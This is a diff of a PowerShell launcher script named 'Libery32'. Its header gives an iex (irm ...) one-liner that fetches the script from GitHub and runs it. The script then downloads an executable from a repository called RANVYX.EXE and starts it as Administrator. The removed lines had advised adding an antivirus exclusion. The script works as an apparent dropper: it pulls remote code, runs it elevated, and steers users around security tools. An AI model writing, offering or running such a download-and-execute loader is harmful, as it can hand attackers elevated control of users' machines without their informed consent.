@@ -1,119 +1,75 @@
-# Libery32 launcher - works with:
-#   powershell -File .\Libery32.ps1
-#   iex (irm 'https://raw.githubusercontent.com/lubyralph6-maker/Libery32.ps1/main/Libery32.ps1')
+# Libery32 - download exe then run
+# iex (irm 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/Libery32.ps1')
 
 $ErrorActionPreference = 'Stop'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$exeName = 'Libery32.exe'
-$installDir = Join-Path $env:LOCALAPPDATA 'Libery32'
-$exePath = Join-Path $installDir $exeName
-$exeUrl = 'https://raw.githubusercontent.com/lubyralph6-maker/Libery32.ps1/main/Libery32.exe'
-$webUserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Libery32-Launcher/1.0'
+$dir  = Join-Path $env:LOCALAPPDATA 'Libery32'
+$exe  = Join-Path $dir 'Libery32.exe'
+$tmp  = Join-Path $dir 'Libery32.download'
+$urls = @(
+    'https://github.com/lubyralph6-maker/RANVYX.EXE/raw/main/Libery32.exe',
+    'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/Libery32.exe'
+)
+$ua   = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Libery32/1.2'
 
-function Write-Status([string]$Text, [string]$Color = 'White') {
-    Write-Host $Text -ForegroundColor $Color
+function Is-Exe([string]$p) {
+    if (-not (Test-Path -LiteralPath $p)) { return $false }
+    try {
+        $i = Get-Item -LiteralPath $p
+        if ($i.Length -lt 500KB) { return $false }
+        $b = New-Object byte[] 2
+        $fs = [IO.File]::OpenRead($p)
+        try { [void]$fs.Read($b, 0, 2) } finally { $fs.Dispose() }
+        return ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)
+    } catch { return $false }
 }
 
-function Get-LocalExeNearScript {
-    $root = $PSScriptRoot
-    if ([string]::IsNullOrWhiteSpace($root)) {
-        return $null
-    }
-    $localExe = Join-Path $root $exeName
-    if (Test-Path -LiteralPath $localExe) {
-        return $localExe
-    }
-    return $null
-}
-
-function Invoke-DownloadWithRetry {
-    param(
-        [Parameter(Mandatory = $true)][string]$Uri,
-        [Parameter(Mandatory = $true)][string]$OutFile,
-        [int]$MaxRetries = 6
-    )
-
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $headers = @{ 'User-Agent' = $webUserAgent }
-
-    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
-        try {
-            Invoke-WebRequest -Uri $Uri -OutFile $OutFile -UseBasicParsing -Headers $headers
-            return
-        }
-        catch {
-            $statusCode = $null
-            if ($null -ne $_.Exception.Response) {
-                $statusCode = [int]$_.Exception.Response.StatusCode
+function Download-Exe {
+    param([string[]]$UrlList, [string]$OutFile)
+    $last = ''
+    foreach ($url in $UrlList) {
+        for ($n = 1; $n -le 4; $n++) {
+            try {
+                if (Test-Path -LiteralPath $OutFile) { Remove-Item $OutFile -Force -ErrorAction SilentlyContinue }
+                Write-Host "  try: $url" -ForegroundColor DarkGray
+                Invoke-WebRequest -Uri $url -OutFile $OutFile -UseBasicParsing -Headers @{ 'User-Agent' = $ua } -TimeoutSec 180
+                if (Is-Exe $OutFile) { return $true }
+                throw 'Downloaded file is not a valid .exe (upload Libery32.exe to GitHub)'
+            } catch {
+                $last = $_.Exception.Message
+                $wait = if ($last -match '429') { 15 * $n } else { 3 * $n }
+                Write-Host "  [$n/4] fail: $last" -ForegroundColor Yellow
+                Start-Sleep -Seconds $wait
             }
-
-            if ($statusCode -eq 429 -and $attempt -lt $MaxRetries) {
-                $waitSeconds = [Math]::Min(90, [Math]::Pow(2, $attempt))
-                Write-Status "GitHub rate limit (429). Retry in ${waitSeconds}s... ($attempt/$MaxRetries)" Yellow
-                Start-Sleep -Seconds $waitSeconds
-                continue
-            }
-
-            throw
         }
     }
-}
-
-function Get-CachedOrDownloadedExe {
-    if (-not (Test-Path -LiteralPath $installDir)) {
-        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
-    }
-
-    if (Test-Path -LiteralPath $exePath) {
-        Write-Status "Using cached: $exePath" Green
-        return $exePath
-    }
-
-    Write-Status "Downloading: $exeUrl" Cyan
-    Invoke-DownloadWithRetry -Uri $exeUrl -OutFile $exePath
-    Write-Status 'Downloaded' Green
-
-    if (-not (Test-Path -LiteralPath $exePath)) {
-        throw 'Download failed - Libery32.exe not found after download.'
-    }
-
-    return $exePath
-}
-
-function Resolve-ExePath {
-    $local = Get-LocalExeNearScript
-    if ($null -ne $local) {
-        return $local
-    }
-    return Get-CachedOrDownloadedExe
+    throw "Cannot download Libery32.exe - $last"
 }
 
 try {
-    $targetExe = Resolve-ExePath
-    if ([string]::IsNullOrWhiteSpace($targetExe)) {
-        throw 'Could not resolve Libery32.exe path.'
+    if (-not (Test-Path -LiteralPath $dir)) {
+        New-Item -ItemType Directory -Path $dir -Force | Out-Null
     }
 
-    Write-Status "Using: $targetExe" Green
-    Write-Status 'Starting Libery32 (Administrator)...' Cyan
-
-    $proc = Start-Process -FilePath $targetExe -Verb RunAs -PassThru
-    if ($null -eq $proc) {
-        throw 'Start-Process returned null.'
+    if (-not (Is-Exe $exe)) {
+        Write-Host 'Downloading Libery32.exe ...' -ForegroundColor Cyan
+        Download-Exe -UrlList $urls -OutFile $tmp
+        Move-Item -LiteralPath $tmp -Destination $exe -Force
+        Write-Host "Downloaded: $exe ($((Get-Item $exe).Length) bytes)" -ForegroundColor Green
+    } else {
+        Write-Host "Using cache: $exe" -ForegroundColor Green
     }
 
+    Write-Host 'Starting as Administrator...' -ForegroundColor Cyan
+    $p = Start-Process -FilePath $exe -Verb RunAs -PassThru
+    if ($null -eq $p) { throw 'UAC cancelled' }
     Start-Sleep -Seconds 2
-    if ($proc.HasExited) {
-        throw "Libery32 closed immediately (exit $($proc.ExitCode)). Install VC++ x64 Redistributable and add antivirus exclusion."
-    }
-
-    Write-Status 'Libery32 is running.' Green
-    Write-Status 'Finished' Green
+    if ($p.HasExited) { throw "Exe closed immediately (exit $($p.ExitCode))" }
+    Write-Host 'Libery32 is running.' -ForegroundColor Green
 }
 catch {
-    Write-Status "Error: $($_.Exception.Message)" Red
-    Write-Status 'Fix: upload Libery32.exe + Libery32.ps1 to GitHub, or copy exe + ps1 in same folder.' Yellow
-    Write-Status 'If 429: wait 15-30 min, then run the link once (do not spam Enter).' Yellow
+    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
 }
 
 Write-Host ''
